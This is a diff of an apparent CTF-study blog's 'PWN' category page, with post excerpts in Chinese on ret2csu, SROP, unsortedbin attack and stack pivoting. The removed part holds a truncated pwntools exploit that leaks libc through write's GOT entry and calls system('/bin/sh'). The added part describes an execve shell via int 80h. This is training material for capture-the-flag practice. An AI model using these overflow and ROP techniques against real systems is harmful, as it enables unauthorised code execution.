@@ -1,22 +1,264 @@
-<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>PWN | BLOG</title><meta name=keywords content><meta name=description content="ExampleSite description"><meta name=author content="JUHUA"><link rel=canonical href=https://juhuax.github.io/categories/pwn/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.4e75d3a6e83470cbf55a23cee683af5cbbe70b5bf3928f07329fc682ebf90c12.css integrity="sha256-TnXTpug0cMv1WiPO5oOvXLvnC1vzko8HMp/Gguv5DBI=" rel="preload stylesheet" as=style><link rel=icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://juhuax.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://juhuax.github.io/categories/pwn/index.xml><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="PWN"><meta property="og:description" content="ExampleSite description"><meta property="og:type" content="website"><meta property="og:url" content="https://juhuax.github.io/categories/pwn/"><meta property="og:image" content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="PWN"><meta name=twitter:description content="ExampleSite description"></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://juhuax.github.io/ accesskey=h title="JUHUA BLOG (Alt + H)"><img src=https://juhuax.github.io/apple-touch-icon.png alt aria-label=logo height=35>JUHUA BLOG</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://juhuax.github.io/archives/ title=archives><span>archives</span></a></li><li><a href=https://juhuax.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://juhuax.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://juhuax.github.io/about/ title=about><span>about</span></a></li><li><a href=https://juhuax.github.io/search/ title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=https://juhuax.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://juhuax.github.io/categories/>Categories</a></div><h1>PWN
-<a href=/categories/pwn/index.xml title=RSS aria-label=RSS><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" height="23"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></h1></header><article class="post-entry tag-entry"><header class=entry-header><h2>ret2csu（以ciscn_2019_s_3为例子）</h2></header><div class=entry-content><p>参考：(67条消息) 中级ROP之ret2csu_西杭的博客-CSDN博客
-适用场景 在我们想要调用系统调用，或者在 64 位程序中通过寄存器传递参数，需要设置寄存器中的值，但是有的时候可能没有搜到足够 gadgets 来对寄存器设置值。这个时候需要 csu 函数。
-概述 __libc_csu_init 函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们可以构造栈的分布，然后控制程序跳转到 csu，将寄存器的值设置为所需要的值。
-原理 __libc_csu_init 函数的汇编指令 .text:00000000004011B0 ; void _libc_csu_init(void) .text:00000000004011B0 public __libc_csu_init .text:00000000004011B0 __libc_csu_init proc near ; DATA XREF: _start+16↑o .text:00000000004011B0 ; __unwind { .text:00000000004011B0 push r15 .text:00000000004011B2 mov r15, rdx .text:00000000004011B5 push r14 .text:00000000004011B7 mov r14, rsi .text:00000000004011BA push r13 .text:00000000004011BC mov r13d, edi .text:00000000004011BF push r12 .text:00000000004011C1 lea r12, __frame_dummy_init_array_entry .text:00000000004011C8 push rbp ....</p></div><footer class=entry-footer><span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;438 words&nbsp;·&nbsp;JUHUA
-创建:&nbsp;<span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;|&nbsp;时长: 3分钟&nbsp;|&nbsp;JUHUA</footer><a class=entry-link aria-label="post link to ret2csu（以ciscn_2019_s_3为例子）" href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/ret2csu%E4%BB%A5ciscn_2019_s_3%E4%B8%BA%E4%BE%8B%E5%AD%90/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2>SROP</h2></header><div class=entry-content><p>SROP srop 的全称是 Sigreturn Oriented Programming。所以我们首先需要了解一下 Linux 的信号机制
-signal 机制 如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。如图所示，当有中断或异常产生时，内核会向某个进程发送一个 signal，该进程被挂起并进入内核（1），然后内核为该进程保存相应的上下文，然后跳转到之前注册好的 signal handler 中处理相应的 signal（2），当 signal handler 返回后（3），内核为该进程恢复之前保存的上下文，最终恢复进程的执行（4）。
-一个 signal frame 被添加到栈，这个 frame 中包含了当前寄存器的值和一些 signal 信息。 一个新的返回地址被添加到栈顶，这个返回地址指向 sigreturn 系统调用。 signal handler 被调用，signal handler 的行为取决于收到什么 signal。 signal handler 执行完之后，如果程序没有终止，则返回地址用于执行 sigreturn 系统调用。 sigreturn 利用 signal frame 恢复所有寄存器以回到之前的状态。 最后，程序执行继续。 64 位的 signal frame 如下图所示，signal frame 由 ucontext_t 结构体实现。 // defined in /usr/include/sys/ucontext.h /* Userlevel context....</p></div><footer class=entry-footer><span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;373 words&nbsp;·&nbsp;JUHUA
-创建:&nbsp;<span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;|&nbsp;时长: 2分钟&nbsp;|&nbsp;JUHUA</footer><a class=entry-link aria-label="post link to SROP" href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/srop/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2>unsortedbin attack</h2></header><div class=entry-content><p>(72条消息) 堆漏洞挖掘——unsortedbin attack漏洞_unsorted bin attack_董哥的黑板报的博客-CSDN博客 ubsortedbin attack是用来配合 [[fastbin attack]] 的。 ubsortedbin attack是双向链表，所以系统会将我们伪造的fake chunk的fd和bk都指回unsortedbin链，而这个地址肯定是0x7f开头的大数值，所以就在目标地址处写入了0x7f。</p></div><footer class=entry-footer><span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;13 words&nbsp;·&nbsp;JUHUA
-创建:&nbsp;<span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;|&nbsp;时长: 1分钟&nbsp;|&nbsp;JUHUA</footer><a class=entry-link aria-label="post link to unsortedbin attack" href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/unsortedbin-attack/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2>栈迁移</h2></header><div class=entry-content><p>参考：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)（这篇写的及其详细）
-适用场景 当栈上的空间，或者程序的输入字符数量不够我们进行溢出操作的时候，可以进行栈迁移。比如一般栈溢出的题目都会有一个字符串数组，当程序在读入我们的输入的时候将读取的字符数量写死的时候，可能我们就没有足够的空间去填入 ROP 链。
-概述 栈迁移顾名思义就是将原来的程序栈迁移到另一个地方，使得我们可以将构造的 ROP 链完整的填入。 那么想要修改栈的位置，那么就需要修改寄存器 esp 和 ebp 的值。 想要修改 esp 和 ebp 的值，我们需要用到 leave 和 ret 两个 gadget。
-原理 leave & ret leave 命令由两句汇编指令组成：mov esp, ebp和pop ebp 它将 ebp 的值交给 esp，然后将栈顶的值弹给 ebp。操作结束后 esp 的值是 old ebp+4，ebp 的值是*old ebp ret 命令是 pop rip 将栈顶的值弹给 rip
-两次 leave&amp;ret 我们可以看到 leave 命令可以修改 esp 和 ebp 寄存器，但是只用一次 leave 是无法同时修改 esp 和 ebp 的。因为当我们将栈上的数据覆盖后，执行 leave，只能将栈上的数据 pop 给 ebp，而 esp 没有办法修改。所以我们需要进行两次 leave。...</p></div><footer class=entry-footer><span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;379 words&nbsp;·&nbsp;JUHUA
-创建:&nbsp;<span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;|&nbsp;时长: 2分钟&nbsp;|&nbsp;JUHUA</footer><a class=entry-link aria-label="post link to 栈迁移" href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E6%A0%88%E8%BF%81%E7%A7%BB/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2>简单题(旧)</h2></header><div class=entry-content><p>2022-8-28 get_started_3dsctf_2016 | LiuLian (liul14n.top)
-2022-8-27 [OGeek2019]babyrop1 有一些本地 libc 函数的用法，参考一下
-from pwn import * from LibcSearcher import * p = remote("node4.buuoj.cn", 28820) elf=ELF('./pwn1') libc=ELF('./libc-2.23.so') system_libc=libc.symbols['system'] binsh_libc=next(libc.search(b'/bin/sh')) write_plt=elf.plt['write'] write_got=elf.got['write'] write_libc=libc.symbols['write'] read_got=elf.got['read'] read_plt=elf.plt['read'] main_addr=0x8048825 #payload1-截断strlen payload1=b'\x00'+b'\xff'*7 p.sendline(payload1) p.recvuntil("Correct\n") #pay;pad2 - 泄露read的got地址 payload=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr) # ret1 ret2 payload+=p32(1)+p32(write_got)+p32(4) #write par1 par2 par3 #write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数 p.sendline(payload) write_addr=u32(p.recv(4)) print('[+]write_addr: ', hex(write_addr))#得到了write在内存中的位置 可以用题目提供的函数共享库算出system在内存中的位置 # libc=LibcSearcher('read', read_addr) # libc_base=read_addr-libc.dump('read') # system_addr=libc_base+libc.dump('system') # binsh_addr=libc_base+libc.dump('str_bin_sh') libc_base=write_addr-write_libc system_addr=system_libc+libc_base binsh_addr=binsh_libc+libc_base p.sendline(payload1) p.recvuntil("Correct\n") payload=b'a'*(0xe7+4) payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)#第二次直接把返回地址改为addr地址 p....</p></div><footer class=entry-footer><span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;694 words&nbsp;·&nbsp;JUHUA
-创建:&nbsp;<span title='2023-06-22 00:00:00 +0000 UTC'>June 22, 2023</span>&nbsp;|&nbsp;时长: 4分钟&nbsp;|&nbsp;JUHUA</footer><a class=entry-link aria-label="post link to 简单题(旧)" href=https://juhuax.github.io/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E7%AE%80%E5%8D%95%E9%A2%98%E6%97%A7/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=https://juhuax.github.io/categories/pwn/>«&nbsp;Prev&nbsp;</a>
-<a class=next href=https://juhuax.github.io/categories/pwn/page/3/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2023 <a href=https://juhuax.github.io/>BLOG</a></span>
-<span>Powered by
-<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
-        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PWN | JUHUA&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="">
+<meta name="author" content="JUHUA">
+<link rel="canonical" href="https://juhuax.github.io/categories/pwn/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.4ab2947a83bffe949c0838eecd8aec6f58435be7a122bafeab2b538d1cdcf5ad.css" integrity="sha256-SrKUeoO//pScCDjuzYrsb1hDW&#43;ehIrr&#43;qytTjRzc9a0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://juhuax.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://juhuax.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://juhuax.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://juhuax.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://juhuax.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://juhuax.github.io/categories/pwn/index.xml">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css" />
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><meta property="og:title" content="PWN" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://juhuax.github.io/categories/pwn/" /><meta property="og:image" content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"/><meta property="og:site_name" content="JUHUA&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://juhuax.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"/>
+
+<meta name="twitter:title" content="PWN"/>
+<meta name="twitter:description" content=""/>
+
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://juhuax.github.io/" accesskey="h" title="JUHUA&#39;s Blog (Alt + H)">
+                <img src="https://juhuax.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">JUHUA&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://juhuax.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://juhuax.github.io/archives/" title="archives">
+                    <span>archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://juhuax.github.io/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://juhuax.github.io/tags/" title="tags">
+                    <span>tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://juhuax.github.io/about" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://juhuax.github.io/links" title="🤝友链">
+                    <span>🤝友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="https://juhuax.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://juhuax.github.io/categories/">Categories</a></div>
+  <h1>
+    PWN
+    <a href="/categories/pwn/index.xml" title="RSS" aria-label="RSS">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" height="23">
+        <path d="M4 11a9 9 0 0 1 9 9" />
+        <path d="M4 4a16 16 0 0 1 16 16" />
+        <circle cx="5" cy="19" r="1" />
+      </svg>
+    </a>
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2>静态链接栈溢出
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>利用int 80h系统调用 设置系统调用参数即可执行 execve(&#34;\bin\sh&#34;,0,0)，获取shell ，四个参数分别...</p>
+  </div>
+  <a class="entry-link" aria-label="post link to 静态链接栈溢出" href="https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E6%A0%88%E6%BA%A2%E5%87%BA/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="https://juhuax.github.io/categories/pwn/">
+      «&nbsp;Prev&nbsp;
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+    <span>JUHUA</span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
